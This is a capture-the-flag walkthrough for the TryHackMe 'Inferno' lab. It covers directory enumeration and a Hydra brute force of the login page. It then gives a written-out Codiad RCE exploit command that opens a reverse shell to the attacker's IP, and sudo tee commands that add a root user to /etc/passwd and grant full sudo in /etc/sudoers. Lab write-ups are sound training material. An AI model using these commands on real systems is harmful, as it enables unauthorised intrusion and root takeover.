# 69 - Inferno

Room Link --> [https://tryhackme.com/room/inferno](https://tryhackme.com/room/inferno)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
```
{% endcode %}

#### Gobuster enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.103.251/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error

/inferno
```
{% endcode %}

We have an authentication page

<figure><img src=".gitbook/assets/image (463).png" alt=""><figcaption></figcaption></figure>

#### Bruteforce with Hydra

<figure><img src=".gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

`admin : dante1` .

Logged in&#x20;

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Access

We search Google for any exploit since we are authenticated as admin user and found: this [repo](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit)

So because we are authenticating twice, we use the cmd:

{% code overflow="wrap" lineNumbers="true" %}
```
python2.7 exploit.py http://admin:dante1@10.10.103.251/inferno/ admin dante1 10.18.88.214 9001 linux
```
{% endcode %}

And got shell

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There is a .Download.dat file in the /home/dante dir, contains some cipher text.

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We got an SSH credentials: `dante : V1rg1l10h3lpm3`&#x20;

And we are logged in.

### Priv Esc

`sudo -l` - we can run tee as root.

There’s a binary available to run it as sudo. “**tee”** reads from standard input and write to standard output and files. So, we can edit any configuration file to gain root shell

We can use tee to add config to files.

#### /etc/passwd file

Lets add a new root user to /etc/passwd file

{% code overflow="wrap" %}
```bash
dante@Inferno:~$ LFILE=/etc/passwd

dante@Inferno:~$ echo "dking:$(openssl passwd -6 -salt noraj password):0:0:noraj:/root:/bin/bash" | sudo tee -a "$LFILE"

dante@Inferno:~$ su dking
```
{% endcode %}

And we are root.

Or

#### Sudoers file

We can also add dante to the sudoers file to execute all sudo cmds.

```bash
echo "dante ALL=(root) ALL" | sudo tee -a /etc/sudoers o tee -a /etc/sudoers
```

Done!

